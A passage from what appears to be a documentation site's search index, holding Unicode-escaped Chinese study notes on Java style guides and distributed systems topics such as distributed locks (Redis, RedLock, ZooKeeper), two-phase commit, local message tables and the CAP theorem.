9\u5230\u6700\u540E\u5F80\u5F80\u662F\u65E0\u7528\u7684\u3002
\u591A\u7528\u6807\u51C6\u5E93\u5B9E\u73B0\u3002`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:"Dustin, Boswell, Trevor, \u7B49. \u7F16\u5199\u53EF\u8BFB\u4EE3\u7801\u7684\u827A\u672F [M]. \u673A\u68B0\u5DE5\u4E1A\u51FA\u7248\u793E, 2012."}]},{path:"/java/%E4%BB%A3%E7%A0%81%E9%A3%8E%E6%A0%BC%E8%A7%84%E8%8C%83.html",title:"",pathLocale:"/",contents:[{header:"",slug:"",content:`Twitter Java Style Guide
Google Java Style Guide
\u963F\u91CC\u5DF4\u5DF4Java\u5F00\u53D1\u624B\u518C`}]},{path:"/java/%E5%88%86%E5%B8%83%E5%BC%8F.html",title:"\u5206\u5E03\u5F0F",pathLocale:"/",contents:[{header:"\u5206\u5E03\u5F0F",slug:"\u5206\u5E03\u5F0F",content:`\u5206\u5E03\u5F0F \u4E00\u3001\u5206\u5E03\u5F0F\u9501 \u6570\u636E\u5E93\u7684\u552F\u4E00\u7D22\u5F15
Redis \u7684 SETNX \u6307\u4EE4
Redis \u7684 RedLock \u7B97\u6CD5
Zookeeper \u7684\u6709\u5E8F\u8282\u70B9 \u4E8C\u3001\u5206\u5E03\u5F0F\u4E8B\u52A1 2PC
\u672C\u5730\u6D88\u606F\u8868 \u4E09\u3001CAP \u4E00\u81F4\u6027
\u53EF\u7528\u6027
\u5206\u533A\u5BB9\u5FCD\u6027
\u6743\u8861 \u56DB\u3001BASE \u57FA\u672C\u53EF\u7528
\u8F6F\u72B6\u6001
\u6700\u7EC8\u4E00\u81F4\u6027 \u4E94\u3001Paxos \u6267\u884C\u8FC7\u7A0B
\u7EA6\u675F\u6761\u4EF6 \u516D\u3001Raft \u5355\u4E2A Candidate \u7684\u7ADE\u9009
\u591A\u4E2A Candidate \u7ADE\u9009
\u6570\u636E\u540C\u6B65 \u53C2\u8003`},{header:"\u4E00\u3001\u5206\u5E03\u5F0F\u9501",slug:"\u4E00\u3001\u5206\u5E03\u5F0F\u9501",content:`\u5728\u5355\u673A\u573A\u666F\u4E0B\uFF0C\u53EF\u4EE5\u4F7F\u7528\u8BED\u8A00\u7684\u5185\u7F6E\u9501\u6765\u5B9E\u73B0\u8FDB\u7A0B\u540C\u6B65\u3002\u4F46\u662F\u5728\u5206\u5E03\u5F0F\u573A\u666F\u4E0B\uFF0C\u9700\u8981\u540C\u6B65\u7684\u8FDB\u7A0B\u53EF\u80FD\u4F4D\u4E8E\u4E0D\u540C\u7684\u8282\u70B9\u4E0A\uFF0C\u90A3\u4E48\u5C31\u9700\u8981\u4F7F\u7528\u5206\u5E03\u5F0F\u9501\u3002
\u963B\u585E\u9501\u901A\u5E38\u4F7F\u7528\u4E92\u65A5\u91CF\u6765\u5B9E\u73B0\uFF1A \u4E92\u65A5\u91CF\u4E3A 0 \u8868\u793A\u6709\u5176\u5B83\u8FDB\u7A0B\u5728\u4F7F\u7528\u9501\uFF0C\u6B64\u65F6\u5904\u4E8E\u9501\u5B9A\u72B6\u6001\uFF1B
\u4E92\u65A5\u91CF\u4E3A 1 \u8868\u793A\u672A\u9501\u5B9A\u72B6\u6001\u3002 1 \u548C 0 \u53EF\u4EE5\u7528\u4E00\u4E2A\u6574\u578B\u503C\u8868\u793A\uFF0C\u4E5F\u53EF\u4EE5\u7528\u67D0\u4E2A\u6570\u636E\u662F\u5426\u5B58\u5728\u8868\u793A\u3002`},{header:"\u6570\u636E\u5E93\u7684\u552F\u4E00\u7D22\u5F15",slug:"\u6570\u636E\u5E93\u7684\u552F\u4E00\u7D22\u5F15",content:`\u83B7\u5F97\u9501\u65F6\u5411\u8868\u4E2D\u63D2\u5165\u4E00\u6761\u8BB0\u5F55\uFF0C\u91CA\u653E\u9501\u65F6\u5220\u9664\u8FD9\u6761\u8BB0\u5F55\u3002\u552F\u4E00\u7D22\u5F15\u53EF\u4EE5\u4FDD\u8BC1\u8BE5\u8BB0\u5F55\u53EA\u88AB\u63D2\u5165\u4E00\u6B21\uFF0C\u90A3\u4E48\u5C31\u53EF\u4EE5\u7528\u8FD9\u4E2A\u8BB0\u5F55\u662F\u5426\u5B58\u5728\u6765\u5224\u65AD\u662F\u5426\u5904\u4E8E\u9501\u5B9A\u72B6\u6001\u3002
\u5B58\u5728\u4EE5\u4E0B\u51E0\u4E2A\u95EE\u9898\uFF1A \u9501\u6CA1\u6709\u5931\u6548\u65F6\u95F4\uFF0C\u89E3\u9501\u5931\u8D25\u7684\u8BDD\u5176\u5B83\u8FDB\u7A0B\u65E0\u6CD5\u518D\u83B7\u5F97\u8BE5\u9501\uFF1B
\u53EA\u80FD\u662F\u975E\u963B\u585E\u9501\uFF0C\u63D2\u5165\u5931\u8D25\u76F4\u63A5\u5C31\u62A5\u9519\u4E86\uFF0C\u65E0\u6CD5\u91CD\u8BD5\uFF1B
\u4E0D\u53EF\u91CD\u5165\uFF0C\u5DF2\u7ECF\u83B7\u5F97\u9501\u7684\u8FDB\u7A0B\u4E5F\u5FC5\u987B\u91CD\u65B0\u83B7\u53D6\u9501\u3002`},{header:"Redis \u7684 SETNX \u6307\u4EE4",slug:"redis-\u7684-setnx-\u6307\u4EE4",content:`\u4F7F\u7528 SETNX\uFF08set if not exist\uFF09\u6307\u4EE4\u63D2\u5165\u4E00\u4E2A\u952E\u503C\u5BF9\uFF0C\u5982\u679C Key \u5DF2\u7ECF\u5B58\u5728\uFF0C\u90A3\u4E48\u4F1A\u8FD4\u56DE False\uFF0C\u5426\u5219\u63D2\u5165\u6210\u529F\u5E76\u8FD4\u56DE True\u3002
SETNX \u6307\u4EE4\u548C\u6570\u636E\u5E93\u7684\u552F\u4E00\u7D22\u5F15\u7C7B\u4F3C\uFF0C\u4FDD\u8BC1\u4E86\u53EA\u5B58\u5728\u4E00\u4E2A Key \u7684\u952E\u503C\u5BF9\uFF0C\u90A3\u4E48\u53EF\u4EE5\u7528\u4E00\u4E2A Key \u7684\u952E\u503C\u5BF9\u662F\u5426\u5B58\u5728\u6765\u5224\u65AD\u662F\u5426\u5B58\u4E8E\u9501\u5B9A\u72B6\u6001\u3002
EXPIRE \u6307\u4EE4\u53EF\u4EE5\u4E3A\u4E00\u4E2A\u952E\u503C\u5BF9\u8BBE\u7F6E\u4E00\u4E2A\u8FC7\u671F\u65F6\u95F4\uFF0C\u4ECE\u800C\u907F\u514D\u4E86\u6570\u636E\u5E93\u552F\u4E00\u7D22\u5F15\u5B9E\u73B0\u65B9\u5F0F\u4E2D\u91CA\u653E\u9501\u5931\u8D25\u7684\u95EE\u9898\u3002`},{header:"Redis \u7684 RedLock \u7B97\u6CD5",slug:"redis-\u7684-redlock-\u7B97\u6CD5",content:`\u4F7F\u7528\u4E86\u591A\u4E2A Redis \u5B9E\u4F8B\u6765\u5B9E\u73B0\u5206\u5E03\u5F0F\u9501\uFF0C\u8FD9\u662F\u4E3A\u4E86\u4FDD\u8BC1\u5728\u53D1\u751F\u5355\u70B9\u6545\u969C\u65F6\u4ECD\u7136\u53EF\u7528\u3002 \u5C1D\u8BD5\u4ECE N \u4E2A\u4E92\u76F8\u72EC\u7ACB Redis \u5B9E\u4F8B\u83B7\u53D6\u9501\uFF1B
\u8BA1\u7B97\u83B7\u53D6\u9501\u6D88\u8017\u7684\u65F6\u95F4\uFF0C\u53EA\u6709\u65F6\u95F4\u5C0F\u4E8E\u9501\u7684\u8FC7\u671F\u65F6\u95F4\uFF0C\u5E76\u4E14\u4ECE\u5927\u591A\u6570\uFF08N / 2 + 1\uFF09\u5B9E\u4F8B\u4E0A\u83B7\u53D6\u4E86\u9501\uFF0C\u624D\u8BA4\u4E3A\u83B7\u53D6\u9501\u6210\u529F\uFF1B
\u5982\u679C\u83B7\u53D6\u9501\u5931\u8D25\uFF0C\u5C31\u5230\u6BCF\u4E2A\u5B9E\u4F8B\u4E0A\u91CA\u653E\u9501\u3002`},{header:"Zookeeper \u7684\u6709\u5E8F\u8282\u70B9",slug:"zookeeper-\u7684\u6709\u5E8F\u8282\u70B9",content:""},{header:"1. Zookeeper \u62BD\u8C61\u6A21\u578B",slug:"_1-zookeeper-\u62BD\u8C61\u6A21\u578B",content:`Zookeeper \u63D0\u4F9B\u4E86\u4E00\u79CD\u6811\u5F62\u7ED3\u6784\u7684\u547D\u540D\u7A7A\u95F4\uFF0C/app1/p_1 \u8282\u70B9\u7684\u7236\u8282\u70B9\u4E3A /app1\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/aefa8042-15fa-4e8b-9f50-20b282a2c624.png" width="320px">`},{header:"2. \u8282\u70B9\u7C7B\u578B",slug:"_2-\u8282\u70B9\u7C7B\u578B",content:`\u6C38\u4E45\u8282\u70B9\uFF1A\u4E0D\u4F1A\u56E0\u4E3A\u4F1A\u8BDD\u7ED3\u675F\u6216\u8005\u8D85\u65F6\u800C\u6D88\u5931\uFF1B
\u4E34\u65F6\u8282\u70B9\uFF1A\u5982\u679C\u4F1A\u8BDD\u7ED3\u675F\u6216\u8005\u8D85\u65F6\u5C31\u4F1A\u6D88\u5931\uFF1B
\u6709\u5E8F\u8282\u70B9\uFF1A\u4F1A\u5728\u8282\u70B9\u540D\u7684\u540E\u9762\u52A0\u4E00\u4E2A\u6570\u5B57\u540E\u7F00\uFF0C\u5E76\u4E14\u662F\u6709\u5E8F\u7684\uFF0C\u4F8B\u5982\u751F\u6210\u7684\u6709\u5E8F\u8282\u70B9\u4E3A /lock/node-0000000000\uFF0C\u5B83\u7684\u4E0B\u4E00\u4E2A\u6709\u5E8F\u8282\u70B9\u5219\u4E3A /lock/node-0000000001\uFF0C\u4EE5\u6B64\u7C7B\u63A8\u3002`},{header:"3. \u76D1\u542C\u5668",slug:"_3-\u76D1\u542C\u5668",content:"\u4E3A\u4E00\u4E2A\u8282\u70B9\u6CE8\u518C\u76D1\u542C\u5668\uFF0C\u5728\u8282\u70B9\u72B6\u6001\u53D1\u751F\u6539\u53D8\u65F6\uFF0C\u4F1A\u7ED9\u5BA2\u6237\u7AEF\u53D1\u9001\u6D88\u606F\u3002"},{header:"4. \u5206\u5E03\u5F0F\u9501\u5B9E\u73B0",slug:"_4-\u5206\u5E03\u5F0F\u9501\u5B9E\u73B0",content:`\u521B\u5EFA\u4E00\u4E2A\u9501\u76EE\u5F55 /lock\uFF1B
\u5F53\u4E00\u4E2A\u5BA2\u6237\u7AEF\u9700\u8981\u83B7\u53D6\u9501\u65F6\uFF0C\u5728 /lock \u4E0B\u521B\u5EFA\u4E34\u65F6\u7684\u4E14\u6709\u5E8F\u7684\u5B50\u8282\u70B9\uFF1B
\u5BA2\u6237\u7AEF\u83B7\u53D6 /lock \u4E0B\u7684\u5B50\u8282\u70B9\u5217\u8868\uFF0C\u5224\u65AD\u81EA\u5DF1\u521B\u5EFA\u7684\u5B50\u8282\u70B9\u662F\u5426\u4E3A\u5F53\u524D\u5B50\u8282\u70B9\u5217\u8868\u4E2D\u5E8F\u53F7\u6700\u5C0F\u7684\u5B50\u8282\u70B9\uFF0C\u5982\u679C\u662F\u5219\u8BA4\u4E3A\u83B7\u5F97\u9501\uFF1B\u5426\u5219\u76D1\u542C\u81EA\u5DF1\u7684\u524D\u4E00\u4E2A\u5B50\u8282\u70B9\uFF0C\u83B7\u5F97\u5B50\u8282\u70B9\u7684\u53D8\u66F4\u901A\u77E5\u540E\u91CD\u590D\u6B64\u6B65\u9AA4\u76F4\u81F3\u83B7\u5F97\u9501\uFF1B
\u6267\u884C\u4E1A\u52A1\u4EE3\u7801\uFF0C\u5B8C\u6210\u540E\uFF0C\u5220\u9664\u5BF9\u5E94\u7684\u5B50\u8282\u70B9\u3002`},{header:"5. \u4F1A\u8BDD\u8D85\u65F6",slug:"_5-\u4F1A\u8BDD\u8D85\u65F6",content:"\u5982\u679C\u4E00\u4E2A\u5DF2\u7ECF\u83B7\u5F97\u9501\u7684\u4F1A\u8BDD\u8D85\u65F6\u4E86\uFF0C\u56E0\u4E3A\u521B\u5EFA\u7684\u662F\u4E34\u65F6\u8282\u70B9\uFF0C\u6240\u4EE5\u8BE5\u4F1A\u8BDD\u5BF9\u5E94\u7684\u4E34\u65F6\u8282\u70B9\u4F1A\u88AB\u5220\u9664\uFF0C\u5176\u5B83\u4F1A\u8BDD\u5C31\u53EF\u4EE5\u83B7\u5F97\u9501\u4E86\u3002\u53EF\u4EE5\u770B\u5230\uFF0C\u8FD9\u79CD\u5B9E\u73B0\u65B9\u5F0F\u4E0D\u4F1A\u51FA\u73B0\u6570\u636E\u5E93\u7684\u552F\u4E00\u7D22\u5F15\u5B9E\u73B0\u65B9\u5F0F\u91CA\u653E\u9501\u5931\u8D25\u7684\u95EE\u9898\u3002"},{header:"6. \u7F8A\u7FA4\u6548\u5E94",slug:"_6-\u7F8A\u7FA4\u6548\u5E94",content:"\u4E00\u4E2A\u8282\u70B9\u672A\u83B7\u5F97\u9501\uFF0C\u53EA\u9700\u8981\u76D1\u542C\u81EA\u5DF1\u7684\u524D\u4E00\u4E2A\u5B50\u8282\u70B9\uFF0C\u8FD9\u662F\u56E0\u4E3A\u5982\u679C\u76D1\u542C\u6240\u6709\u7684\u5B50\u8282\u70B9\uFF0C\u90A3\u4E48\u4EFB\u610F\u4E00\u4E2A\u5B50\u8282\u70B9\u72B6\u6001\u6539\u53D8\uFF0C\u5176\u5B83\u6240\u6709\u5B50\u8282\u70B9\u90FD\u4F1A\u6536\u5230\u901A\u77E5\uFF08\u7F8A\u7FA4\u6548\u5E94\uFF0C\u4E00\u53EA\u7F8A\u52A8\u8D77\u6765\uFF0C\u5176\u5B83\u7F8A\u4E5F\u4F1A\u4E00\u54C4\u800C\u4E0A\uFF09\uFF0C\u800C\u6211\u4EEC\u53EA\u5E0C\u671B\u5B83\u7684\u540E\u4E00\u4E2A\u5B50\u8282\u70B9\u6536\u5230\u901A\u77E5\u3002"},{header:"\u4E8C\u3001\u5206\u5E03\u5F0F\u4E8B\u52A1",slug:"\u4E8C\u3001\u5206\u5E03\u5F0F\u4E8B\u52A1",content:`\u6307\u4E8B\u52A1\u7684\u64CD\u4F5C\u4F4D\u4E8E\u4E0D\u540C\u7684\u8282\u70B9\u4E0A\uFF0C\u9700\u8981\u4FDD\u8BC1\u4E8B\u52A1\u7684 ACID \u7279\u6027\u3002
\u4F8B\u5982\u5728\u4E0B\u5355\u573A\u666F\u4E0B\uFF0C\u5E93\u5B58\u548C\u8BA2\u5355\u5982\u679C\u4E0D\u5728\u540C\u4E00\u4E2A\u8282\u70B9\u4E0A\uFF0C\u5C31\u6D89\u53CA\u5206\u5E03\u5F0F\u4E8B\u52A1\u3002
\u5206\u5E03\u5F0F\u9501\u548C\u5206\u5E03\u5F0F\u4E8B\u52A1\u533A\u522B\uFF1A \u9501\u95EE\u9898\u7684\u5173\u952E\u5728\u4E8E\u8FDB\u7A0B\u64CD\u4F5C\u7684\u4E92\u65A5\u5173\u7CFB\uFF0C\u4F8B\u5982\u591A\u4E2A\u8FDB\u7A0B\u540C\u65F6\u4FEE\u6539\u8D26\u6237\u7684\u4F59\u989D\uFF0C\u5982\u679C\u6CA1\u6709\u4E92\u65A5\u5173\u7CFB\u5219\u4F1A\u5BFC\u81F4\u8BE5\u8D26\u6237\u7684\u4F59\u989D\u4E0D\u6B63\u786E\u3002
\u800C\u4E8B\u52A1\u95EE\u9898\u7684\u5173\u952E\u5219\u5728\u4E8E\u4E8B\u52A1\u6D89\u53CA\u7684\u4E00\u7CFB\u5217\u64CD\u4F5C\u9700\u8981\u6EE1\u8DB3 ACID \u7279\u6027\uFF0C\u4F8B\u5982\u8981\u6EE1\u8DB3\u539F\u5B50\u6027\u64CD\u4F5C\u5219\u9700\u8981\u8FD9\u4E9B\u64CD\u4F5C\u8981\u4E48\u90FD\u6267\u884C\uFF0C\u8981\u4E48\u90FD\u4E0D\u6267\u884C\u3002`},{header:"2PC",slug:"_2pc",content:"\u4E24\u9636\u6BB5\u63D0\u4EA4\uFF08Two-phase Commit\uFF0C2PC\uFF09\uFF0C\u901A\u8FC7\u5F15\u5165\u534F\u8C03\u8005\uFF08Coordinator\uFF09\u6765\u534F\u8C03\u53C2\u4E0E\u8005\u7684\u884C\u4E3A\uFF0C\u5E76\u6700\u7EC8\u51B3\u5B9A\u8FD9\u4E9B\u53C2\u4E0E\u8005\u662F\u5426\u8981\u771F\u6B63\u6267\u884C\u4E8B\u52A1\u3002"},{header:"1. \u8FD0\u884C\u8FC7\u7A0B",slug:"_1-\u8FD0\u884C\u8FC7\u7A0B",content:""},{header:"1.1 \u51C6\u5907\u9636\u6BB5",slug:"_1-1-\u51C6\u5907\u9636\u6BB5",content:`\u534F\u8C03\u8005\u8BE2\u95EE\u53C2\u4E0E\u8005\u4E8B\u52A1\u662F\u5426\u6267\u884C\u6210\u529F\uFF0C\u53C2\u4E0E\u8005\u53D1\u56DE\u4E8B\u52A1\u6267\u884C\u7ED3\u679C\u3002\u8BE2\u95EE\u53EF\u4EE5\u770B\u6210\u4E00\u79CD\u6295\u7968\uFF0C\u9700\u8981\u53C2\u4E0E\u8005\u90FD\u540C\u610F\u624D\u80FD\u6267\u884C\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/44d33643-1004-43a3-b99a-4d688a08d0a1.png" width="550px">`},{header:"1.2 \u63D0\u4EA4\u9636\u6BB5",slug:"_1-2-\u63D0\u4EA4\u9636\u6BB5",content:`\u5982\u679C\u4E8B\u52A1\u5728\u6BCF\u4E2A\u53C2\u4E0E\u8005\u4E0A\u90FD\u6267\u884C\u6210\u529F\uFF0C\u4E8B\u52A1\u534F\u8C03\u8005\u53D1\u9001\u901A\u77E5\u8BA9\u53C2\u4E0E\u8005\u63D0\u4EA4\u4E8B\u52A1\uFF1B\u5426\u5219\uFF0C\u534F\u8C03\u8005\u53D1\u9001\u901A\u77E5\u8BA9\u53C2\u4E0E\u8005\u56DE\u6EDA\u4E8B\u52A1\u3002
\u9700\u8981\u6CE8\u610F\u7684\u662F\uFF0C\u5728\u51C6\u5907\u9636\u6BB5\uFF0C\u53C2\u4E0E\u8005\u6267\u884C\u4E86\u4E8B\u52A1\uFF0C\u4F46\u662F\u8FD8\u672A\u63D0\u4EA4\u3002\u53EA\u6709\u5728\u63D0\u4EA4\u9636\u6BB5\u63A5\u6536\u5230\u534F\u8C03\u8005\u53D1\u6765\u7684\u901A\u77E5\u540E\uFF0C\u624D\u8FDB\u884C\u63D0\u4EA4\u6216\u8005\u56DE\u6EDA\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d2ae9932-e2b1-4191-8ee9-e573f36d3895.png" width="550px">`},{header:"2. \u5B58\u5728\u7684\u95EE\u9898",slug:"_2-\u5B58\u5728\u7684\u95EE\u9898",content:""},{header:"2.1 \u540C\u6B65\u963B\u585E",slug:"_2-1-\u540C\u6B65\u963B\u585E",content:"\u6240\u6709\u4E8B\u52A1\u53C2\u4E0E\u8005\u5728\u7B49\u5F85\u5176\u5B83\u53C2\u4E0E\u8005\u54CD\u5E94\u7684\u65F6\u5019\u90FD\u5904\u4E8E\u540C\u6B65\u963B\u585E\u7B49\u5F85\u72B6\u6001\uFF0C\u65E0\u6CD5\u8FDB\u884C\u5176\u5B83\u64CD\u4F5C\u3002"},{header:"2.2 \u5355\u70B9\u95EE\u9898",slug:"_2-2-\u5355\u70B9\u95EE\u9898",content:"\u534F\u8C03\u8005\u5728 2PC \u4E2D\u8D77\u5230\u975E\u5E38\u5927\u7684\u4F5C\u7528\uFF0C\u53D1\u751F\u6545\u969C\u5C06\u4F1A\u9020\u6210\u5F88\u5927\u5F71\u54CD\u3002\u7279\u522B\u662F\u5728\u63D0\u4EA4\u9636\u6BB5\u53D1\u751F\u6545\u969C\uFF0C\u6240\u6709\u53C2\u4E0E\u8005\u4F1A\u4E00\u76F4\u540C\u6B65\u963B\u585E\u7B49\u5F85\uFF0C\u65E0\u6CD5\u5B8C\u6210\u5176\u5B83\u64CD\u4F5C\u3002"},{header:"2.3 \u6570\u636E\u4E0D\u4E00\u81F4",slug:"_2-3-\u6570\u636E\u4E0D\u4E00\u81F4",content:"\u5728\u63D0\u4EA4\u9636\u6BB5\uFF0C\u5982\u679C\u534F\u8C03\u8005\u53EA\u53D1\u9001\u4E86\u90E8\u5206 Commit \u6D88\u606F\uFF0C\u6B64\u65F6\u7F51\u7EDC\u53D1\u751F\u5F02\u5E38\uFF0C\u90A3\u4E48\u53EA\u6709\u90E8\u5206\u53C2\u4E0E\u8005\u63A5\u6536\u5230 Commit \u6D88\u606F\uFF0C\u4E5F\u5C31\u662F\u8BF4\u53EA\u6709\u90E8\u5206\u53C2\u4E0E\u8005\u63D0\u4EA4\u4E86\u4E8B\u52A1\uFF0C\u4F7F\u5F97\u7CFB\u7EDF\u6570\u636E\u4E0D\u4E00\u81F4\u3002"},{header:"2.4 \u592A\u8FC7\u4FDD\u5B88",slug:"_2-4-\u592A\u8FC7\u4FDD\u5B88",content:"\u4EFB\u610F\u4E00\u4E2A\u8282\u70B9\u5931\u8D25\u5C31\u4F1A\u5BFC\u81F4\u6574\u4E2A\u4E8B\u52A1\u5931\u8D25\uFF0C\u6CA1\u6709\u5B8C\u5584\u7684\u5BB9\u9519\u673A\u5236\u3002"},{header:"\u672C\u5730\u6D88\u606F\u8868",slug:"\u672C\u5730\u6D88\u606F\u8868",content:`\u672C\u5730\u6D88\u606F\u8868\u4E0E\u4E1A\u52A1\u6570\u636E\u8868\u5904\u4E8E\u540C\u4E00\u4E2A\u6570\u636E\u5E93\u4E2D\uFF0C\u8FD9\u6837\u5C31\u80FD\u5229\u7528\u672C\u5730\u4E8B\u52A1\u6765\u4FDD\u8BC1\u5728\u5BF9\u8FD9\u4E24\u4E2A\u8868\u7684\u64CD\u4F5C\u6EE1\u8DB3\u4E8B\u52A1\u7279\u6027\uFF0C\u5E76\u4E14\u4F7F\u7528\u4E86\u6D88\u606F\u961F\u5217\u6765\u4FDD\u8BC1\u6700\u7EC8\u4E00\u81F4\u6027\u3002 \u5728\u5206\u5E03\u5F0F\u4E8B\u52A1\u64CD\u4F5C\u7684\u4E00\u65B9\u5B8C\u6210\u5199\u4E1A\u52A1\u6570\u636E\u7684\u64CD\u4F5C\u4E4B\u540E\u5411\u672C\u5730\u6D88\u606F\u8868\u53D1\u9001\u4E00\u4E2A\u6D88\u606F\uFF0C\u672C\u5730\u4E8B\u52A1\u80FD\u4FDD\u8BC1\u8FD9\u4E2A\u6D88\u606F\u4E00\u5B9A\u4F1A\u88AB\u5199\u5165\u672C\u5730\u6D88\u606F\u8868\u4E2D\u3002
\u4E4B\u540E\u5C06\u672C\u5730\u6D88\u606F\u8868\u4E2D\u7684\u6D88\u606F\u8F6C\u53D1\u5230\u6D88\u606F\u961F\u5217\u4E2D\uFF0C\u5982\u679C\u8F6C\u53D1\u6210\u529F\u5219\u5C06\u6D88\u606F\u4ECE\u672C\u5730\u6D88\u606F\u8868\u4E2D\u5220\u9664\uFF0C\u5426\u5219\u7EE7\u7EED\u91CD\u65B0\u8F6C\u53D1\u3002
\u5728\u5206\u5E03\u5F0F\u4E8B\u52A1\u64CD\u4F5C\u7684\u53E6\u4E00\u65B9\u4ECE\u6D88\u606F\u961F\u5217\u4E2D\u8BFB\u53D6\u4E00\u4E2A\u6D88\u606F\uFF0C\u5E76\u6267\u884C\u6D88\u606F\u4E2D\u7684\u64CD\u4F5C\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/476329d4-e2ef-4f7b-8ac9-a52a6f784600.png" width="740px">`},{header:"\u4E09\u3001CAP",slug:"\u4E09\u3001cap",content:`\u5206\u5E03\u5F0F\u7CFB\u7EDF\u4E0D\u53EF\u80FD\u540C\u65F6\u6EE1\u8DB3\u4E00\u81F4\u6027\uFF08C\uFF1AConsistency\uFF09\u3001\u53EF\u7528\u6027\uFF08A\uFF1AAvailability\uFF09\u548C\u5206\u533A\u5BB9\u5FCD\u6027\uFF08P\uFF1APartition Tolerance\uFF09\uFF0C\u6700\u591A\u53EA\u80FD\u540C\u65F6\u6EE1\u8DB3\u5176\u4E2D\u4E24\u9879\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a14268b3-b937-4ffa-a34a-4cc53071686b.jpg" width="450px">`},{header:"\u4E00\u81F4\u6027",slug:"\u4E00\u81F4\u6027",content:`\u4E00\u81F4\u6027\u6307\u7684\u662F\u591A\u4E2A\u6570\u636E\u526F\u672C\u662F\u5426\u80FD\u4FDD\u6301\u4E00\u81F4\u7684\u7279\u6027\uFF0C\u5728\u4E00\u81F4\u6027\u7684\u6761\u4EF6\u4E0B\uFF0C\u7CFB\u7EDF\u5728\u6267\u884C\u6570\u636E\u66F4\u65B0\u64CD\u4F5C\u4E4B\u540E\u80FD\u591F\u4ECE\u4E00\u81F4\u6027\u72B6\u6001\u8F6C\u79FB\u5230\u53E6\u4E00\u4E2A\u4E00\u81F4\u6027\u72B6\u6001\u3002
\u5BF9\u7CFB\u7EDF\u7684\u4E00\u4E2A\u6570\u636E\u66F4\u65B0\u6210\u529F\u4E4B\u540E\uFF0C\u5982\u679C\u6240\u6709\u7528\u6237\u90FD\u80FD\u591F\u8BFB\u53D6\u5230\u6700\u65B0\u7684\u503C\uFF0C\u8BE5\u7CFB\u7EDF\u5C31\u88AB\u8BA4\u4E3A\u5177\u6709\u5F3A\u4E00\u81F4\u6027\u3002`},{header:"\u53EF\u7528\u6027",slug:"\u53EF\u7528\u6027",content:`\u53EF\u7528\u6027\u6307\u5206\u5E03\u5F0F\u7CFB\u7EDF\u5728\u9762\u5BF9\u5404\u79CD\u5F02\u5E38\u65F6\u53EF\u4EE5\u63D0\u4F9B\u6B63\u5E38\u670D\u52A1\u7684\u80FD\u529B\uFF0C\u53EF\u4EE5\u7528\u7CFB\u7EDF\u53EF\u7528\u65F6\u95F4\u5360\u603B\u65F6\u95F4\u7684\u6BD4\u503C\u6765\u8861\u91CF\uFF0C4 \u4E2A 9 \u7684\u53EF\u7528\u6027\u8868\u793A\u7CFB\u7EDF 99.99% \u7684\u65F6\u95F4\u662F\u53EF\u7528\u7684\u3002
\u5728\u53EF\u7528\u6027\u6761\u4EF6\u4E0B\uFF0C\u8981\u6C42\u7CFB\u7EDF\u63D0\u4F9B\u7684\u670D\u52A1\u4E00\u76F4\u5904\u4E8E\u53EF\u7528\u7684\u72B6\u6001\uFF0C\u5BF9\u4E8E\u7528\u6237\u7684\u6BCF\u4E00\u4E2A\u64CD\u4F5C\u8BF7\u6C42\u603B\u662F\u80FD\u591F\u5728\u6709\u9650\u7684\u65F6\u95F4\u5185\u8FD4\u56DE\u7ED3\u679C\u3002`},{header:"\u5206\u533A\u5BB9\u5FCD\u6027",slug:"\u5206\u533A\u5BB9\u5FCD\u6027",content:`\u7F51\u7EDC\u5206\u533A\u6307\u5206\u5E03\u5F0F\u7CFB\u7EDF\u4E2D\u7684\u8282\u70B9\u88AB\u5212\u5206\u4E3A\u591A\u4E2A\u533A\u57DF\uFF0C\u6BCF\u4E2A\u533A\u57DF\u5185\u90E8\u53EF\u4EE5\u901A\u4FE1\uFF0C\u4F46\u662F\u533A\u57DF\u4E4B\u95F4\u65E0\u6CD5\u901A\u4FE1\u3002
\u5728\u5206\u533A\u5BB9\u5FCD\u6027\u6761\u4EF6\u4E0B\uFF0C\u5206\u5E03\u5F0F\u7CFB\u7EDF\u5728\u9047\u5230\u4EFB\u4F55\u7F51\u7EDC\u5206\u533A\u6545\u969C\u7684\u65F6\u5019\uFF0C\u4ECD\u7136\u9700\u8981\u80FD\u5BF9\u5916\u63D0\u4F9B\u4E00\u81F4\u6027\u548C\u53EF\u7528\u6027\u7684\u670D\u52A1\uFF0C\u9664\u975E\u662F\u6574\u4E2A\u7F51\u7EDC\u73AF\u5883\u90FD\u53D1\u751F\u4E86\u6545\u969C\u3002`},{header:"\u6743\u8861",slug:"\u6743\u8861",content:`\u5728\u5206\u5E03\u5F0F\u7CFB\u7EDF\u4E2D\uFF0C\u5206\u533A\u5BB9\u5FCD\u6027\u5FC5\u4E0D\u53EF\u5C11\uFF0C\u56E0\u4E3A\u9700\u8981\u603B\u662F\u5047\u8BBE\u7F51\u7EDC\u662F\u4E0D\u53EF\u9760\u7684\u3002\u56E0\u6B64\uFF0CCAP \u7406\u8BBA\u5B9E\u9645\u4E0A\u662F\u8981\u5728\u53EF\u7528\u6027\u548C\u4E00\u81F4\u6027\u4E4B\u95F4\u505A\u6743\u8861\u3002
\u53EF\u7528\u6027\u548C\u4E00\u81F4\u6027\u5F80\u5F80\u662F\u51B2\u7A81\u7684\uFF0C\u5F88\u96BE\u4F7F\u5B83\u4EEC\u540C\u65F6\u6EE1\u8DB3\u3002\u5728\u591A\u4E2A\u8282\u70B9\u4E4B\u95F4\u8FDB\u884C\u6570\u636E\u540C\u6B65\u65F6\uFF0C \u4E3A\u4E86\u4FDD\u8BC1\u4E00\u81F4\u6027\uFF08CP\uFF09\uFF0C\u4E0D\u80FD\u8BBF\u95EE\u672A\u540C\u6B65\u5B8C\u6210\u7684\u8282\u70B9\uFF0C\u4E5F\u5C31\u5931\u53BB\u4E86\u90E8\u5206\u53EF\u7528\u6027\uFF1B
